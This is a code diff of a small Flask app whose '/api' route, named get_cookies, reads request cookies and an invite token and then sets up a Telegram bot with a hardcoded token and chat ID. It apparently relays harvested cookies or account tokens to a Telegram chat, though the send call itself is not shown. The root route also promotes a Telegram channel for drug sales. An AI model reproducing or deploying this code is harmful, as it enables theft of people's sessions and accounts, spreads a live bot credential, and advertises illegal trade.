@@ -7,9 +7,6 @@ app = Flask(__name__)
 @app.route('/')
 def abc():
     return "Api By Mon Leo Hay Khok Telegram @Monleohaykhok, don't forget join https://t.me/drugsluxury"
-@app.route('/%27')
-def abhc():
-    return "SQL PROTECT"
 @app.route('/api')
 def get_cookies():
         cookies = request.cookies
@@ -50,7 +47,7 @@ def get_cookies():
             result = f"MonLeoHayKhok"
             print(slot)
             result2 = f"MonLeoHaycccKhok"
-            if slot == True and inviteToken != null:
+            if slot == True and inviteToken != None:
               bot_token = '5678937930:AAForYgL5zts5wawsdfmfgP_5-sraeugnp8'  
               bot = telebot.TeleBot(bot_token)
               chat_id = '-1002074013993' 
